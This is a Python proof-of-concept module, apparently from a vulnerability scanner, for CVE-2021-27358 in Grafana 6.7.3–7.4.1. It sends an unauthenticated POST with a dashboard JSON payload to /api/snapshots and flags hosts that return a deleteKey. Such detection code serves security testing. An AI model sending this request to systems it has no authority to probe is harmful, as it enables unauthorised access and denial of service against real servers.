import requests


# Vuln Base Info
def info():
    return {
        "author": "cckuailong",
        "name": '''Grafana Unauthenticated Snapshot Creation''',
        "description": '''The snapshot feature in Grafana 6.7.3 through 7.4.1 can allow an unauthenticated remote attackers to trigger a Denial of Service via a remote API call if a commonly used configuration is set.''',
        "severity": "high",
        "references": [
            "https://phabricator.wikimedia.org/T274736", 
            "https://grafana.com/docs/grafana/latest/release-notes/release-notes-7-4-2/", 
            "https://nvd.nist.gov/vuln/detail/CVE-2021-27358"
        ],
        "classification": {
            "cvss-metrics": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
            "cvss-score": "",
            "cve-id": "CVE-2021-27358",
            "cwe-id": ""
        },
        "metadata":{
            "vuln-target": "",
            
        },
        "tags": ["cve", "cve2021", "grafana", "unauth"],
    }


# Vender Fingerprint
def fingerprint(url):
    return True

# Proof of Concept
def poc(url):
    result = {}
    try:
        url = format_url(url)

        path = """/api/snapshots"""
        method = "POST"
        data = """{"dashboard": {"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows": [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires": 3600}"""
        headers = {'Accept': 'application/json', 'Content-Type': 'application/json'}
        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)

        if ("""deleteUrl":""" in resp0.text and """deleteKey":""" in resp0.text) and ("""application/json""" in str(resp0.headers)):
            result["success"] = True
            result["info"] = info()
            result["payload"] = url+path

    except:
        result["success"] = False
    
    return result


# Exploit, can be same with poc()
def exp(url):
    return poc(url)


# Utils
def format_url(url):
    url = url.strip()
    if not ( url.startswith('http://') or url.startswith('https://') ):
        url = 'http://' + url
    url = url.rstrip('/')

    return url